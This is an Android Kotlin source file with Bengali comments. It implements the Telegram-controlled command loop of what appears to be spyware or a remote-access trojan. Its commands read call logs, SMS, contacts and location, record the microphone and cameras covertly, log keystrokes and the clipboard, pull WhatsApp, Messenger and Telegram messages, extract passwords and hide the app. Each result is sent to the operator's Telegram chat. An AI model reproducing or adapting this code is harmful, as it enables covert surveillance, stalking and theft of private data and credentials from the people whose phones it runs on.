package com.yourapp.control

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject

class TelegramBotService : Service() {

    // ============ কনফিগারেশন ============
    private val BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  // ← আপনার টোকেন দিন
    private val CHAT_ID = "YOUR_CHAT_ID_HERE"     // ← আপনার চ্যাট আইডি দিন

    private val client = OkHttpClient()
    private var lastUpdateId = 0
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        SmsMonitor(this).startMonitoring()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        scope.launch {
            while (true) {
                try {
                    val response = client.newCall(
                        Request.Builder()
                            .url("https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$lastUpdateId&timeout=5")
                            .build()
                    ).execute()

                    val json = JSONObject(response.body?.string() ?: "")
                    val result = json.getJSONArray("result")

                    for (i in 0 until result.length()) {
                        val update = result.getJSONObject(i)
                        lastUpdateId = update.getInt("update_id") + 1
                        val message = update.getJSONObject("message")
                        val text = message.optString("text", "")
                        val chatId = message.getJSONObject("chat").getString("id")

                        if (chatId == CHAT_ID) {
                            handleCommand(text)
                        }
                    }
                } catch (e: Exception) { }
                delay(1000)
            }
        }

        intent?.let {
            if (it.hasExtra("SMS_DATA")) sendMessage(it.getStringExtra("SMS_DATA") ?: "")
            if (it.hasExtra("NOTIFICATION_DATA")) sendMessage(it.getStringExtra("NOTIFICATION_DATA") ?: "")
            if (it.hasExtra("LOCKDOWN_MSG")) sendMessage(it.getStringExtra("LOCKDOWN_MSG") ?: "")
        }

        return START_STICKY
    }

    private fun handleCommand(text: String) {
        when {
            // ============ কল লিস্ট ============
            text == "/call_log" -> sendMessage(Features.callLog(30))
            text == "/call_log_3months" -> sendMessage(Features.callLog(90))
            text == "/missed_calls" -> sendMessage(Features.callLog(90, null, "MISSED"))
            text == "/outgoing_calls" -> sendMessage(Features.callLog(90, null, "OUTGOING"))
            text.startsWith("/call_log_number ") -> {
                val num = text.removePrefix("/call_log_number ")
                sendMessage(Features.callLog(90, num, null))
            }

            // ============ এসএমএস ============
            text == "/sms_list" -> sendMessage(Features.smsList())
            text.startsWith("/send_sms ") -> {
                val parts = text.removePrefix("/send_sms ").split(" ", limit = 2)
                if (parts.size == 2) Features.sendSms(parts[0], parts[1])
                sendMessage("✅ এসএমএস পাঠানো হয়েছে")
            }

            // ============ কল ============
            text.startsWith("/call ") -> {
                Features.call(text.removePrefix("/call "))
                sendMessage("📞 কল করা হচ্ছে")
            }

            // ============ কন্ট্যাক্ট ============
            text == "/contacts" -> sendMessage(Features.contacts())

            // ============ লোকেশন ============
            text == "/location" -> Features.location { sendMessage(it) }
            text == "/live_location" -> Features.liveLocation { sendMessage(it) }
            text == "/location_history" -> sendMessage(Features.locationHistory())

            // ============ ডিভাইস তথ্য ============
            text == "/device_info" -> sendMessage(Features.deviceInfo())
            text == "/imei" -> sendMessage(Features.imei())
            text == "/sim_check" -> sendMessage(Features.simInfo())
            text == "/sim_swap" -> sendMessage(Features.simSwapDetect())

            // ============ স্ক্রিন কন্ট্রোল ============
            text == "/lock" -> { Features.lockScreen(); sendMessage("🔒 স্ক্রিন লক করা হচ্ছে") }
            text == "/unlock" -> { Features.unlockScreen(); sendMessage("💡 স্ক্রিন চালু করা হচ্ছে") }
            text == "/screenshot" -> { Features.screenshot(); sendMessage("📸 স্ক্রিনশট নেওয়া হচ্ছে") }
            text == "/screen_record" -> { Features.screenRecord(); sendMessage("🎬 স্ক্রিন রেকর্ড শুরু") }
            text == "/hide_app" -> { Features.hideApp(); sendMessage("👻 অ্যাপ লুকানো হয়েছে") }
            text.startsWith("/show_msg ") -> {
                Features.showMessage(text.removePrefix("/show_msg "))
                sendMessage("📝 মেসেজ দেখানো হচ্ছে")
            }

            // ============ লকডাউন ============
            text == "/lockdown" -> {
                startService(Intent(this, LockdownService::class.java).putExtra("ACTION", "LOCK"))
                sendMessage("🔒 লকডাউন মোড সক্রিয়")
            }
            text == "/unlock_phone" -> {
                startService(Intent(this, LockdownService::class.java).putExtra("ACTION", "UNLOCK"))
                sendMessage("🔓 লকডাউন মোড বন্ধ")
            }
            text.startsWith("/say ") -> {
                startService(Intent(this, TTSService::class.java).putExtra("MESSAGE", text.removePrefix("/say ")))
                sendMessage("🔊 কথা বলা হচ্ছে")
            }

            // ============ অডিও ============
            text == "/start_mic" -> { Features.startMic(); sendMessage("🎙️ অডিও রেকর্ড শুরু") }
            text == "/stop_mic" -> { Features.stopMic(); sendMessage("⏹️ অডিও রেকর্ড বন্ধ") }
            text == "/live_mic" -> { Features.liveMicStream(); sendMessage("🎙️ লাইভ মাইক শুরু") }

            // ============ ক্যামেরা ============
            text == "/front_camera" -> { Features.startCamera("front"); sendMessage("📷 সামনের ক্যামেরা") }
            text == "/back_camera" -> { Features.startCamera("back"); sendMessage("📷 পেছনের ক্যামেরা") }
            text == "/live_camera" -> { Features.liveCameraStream(); sendMessage("🎥 লাইভ ক্যামেরা শুরু") }

            // ============ সিস্টেম তথ্য ============
            text == "/battery" -> sendMessage(Features.battery())
            text == "/storage" -> sendMessage(Features.storage())
            text == "/ram" -> sendMessage(Features.ram())
            text == "/netspeed" -> sendMessage(Features.networkSpeed())
            text == "/app_usage" -> sendMessage(Features.appUsage())
            text == "/running_apps" -> sendMessage(Features.runningApps())
            text == "/installed_apps" -> sendMessage(Features.installedApps())

            // ============ ওয়াইফাই/ব্লুটুথ ============
            text == "/wifi on" -> { Features.setWifi(true); sendMessage("✅ ওয়াইফাই অন") }
            text == "/wifi off" -> { Features.setWifi(false); sendMessage("❌ ওয়াইফাই অফ") }
            text == "/bluetooth on" -> { Features.setBluetooth(true); sendMessage("✅ ব্লুটুথ অন") }
            text == "/bluetooth off" -> { Features.setBluetooth(false); sendMessage("❌ ব্লুটুথ অফ") }
            text == "/airplane on" -> { Features.setAirplane(true); sendMessage("✈️ এয়ারপ্লেন অন") }
            text == "/airplane off" -> { Features.setAirplane(false); sendMessage("🌍 এয়ারপ্লেন অফ") }

            // ============ কন্ট্রোল ============
            text.startsWith("/brightness ") -> {
                Features.setBrightness(text.removePrefix("/brightness ").toIntOrNull() ?: 50)
                sendMessage("💡 ব্রাইটনেস সেট")
            }
            text.startsWith("/volume ") -> {
                Features.setVolume(text.removePrefix("/volume ").toIntOrNull() ?: 5)
                sendMessage("🔊 ভলিউম সেট")
            }
            text.startsWith("/tap ") -> {
                val parts = text.removePrefix("/tap ").split(",")
                if (parts.size == 2) {
                    Features.tap(parts[0].toIntOrNull() ?: 0, parts[1].toIntOrNull() ?: 0)
                    sendMessage("👆 ট্যাপ করা হয়েছে")
                }
            }

            // ============ কিলগ ও ক্লিপবোর্ড ============
            text == "/clipboard" -> sendMessage(Features.clipboard())
            text == "/start_keylog" -> { Features.startKeylog(); sendMessage("⌨️ কিলগ শুরু") }
            text == "/clipboard_log" -> sendMessage(Features.clipboardLog())

            // ============ ফাইল ============
            text == "/files" -> sendMessage(Features.fileList())
            text == "/gallery" -> sendMessage(Features.gallery())
            text == "/backup" -> { Features.backup(); sendMessage("💾 ব্যাকআপ নেওয়া হয়েছে") }

            // ============ ব্রিচ ও Truecaller ============
            text.startsWith("/breach_search ") -> sendMessage(Features.breachSearch(text.removePrefix("/breach_search ")))
            text.startsWith("/truecaller ") -> sendMessage(Features.truecaller(text.removePrefix("/truecaller ")))

            // ============ মেসেজিং অ্যাপ ============
            text == "/whatsapp" -> sendMessage(Features.whatsappMessages())
            text == "/imo" -> sendMessage(Features.imoMessages())
            text == "/messenger" -> sendMessage(Features.messengerMessages())
            text == "/telegram" -> sendMessage(Features.telegramMessages())

            // ============ পাসওয়ার্ড ============
            text == "/get_passwords" -> sendMessage(Features.getPasswords())

            // ============ হেল্প ============
            text == "/start" -> sendMessage(Features.help())
            text == "/help" -> sendMessage(Features.help())

            else -> sendMessage("❓ অজানা কমান্ড\n/help দেখুন")
        }
    }

    private fun sendMessage(text: String) {
        try {
            val json = JSONObject().apply {
                put("chat_id", CHAT_ID)
                put("text", text)
                put("parse_mode", "Markdown")
            }
            client.newCall(
                Request.Builder()
                    .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                    .post(RequestBody.create(MediaType.parse("application/json"), json.toString()))
                    .build()
            ).execute()
        } catch (e: Exception) { }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Control Bot Service",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Control Bot")
            .setContentText("সক্রিয় আছে...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "control_bot_channel"
    }
}
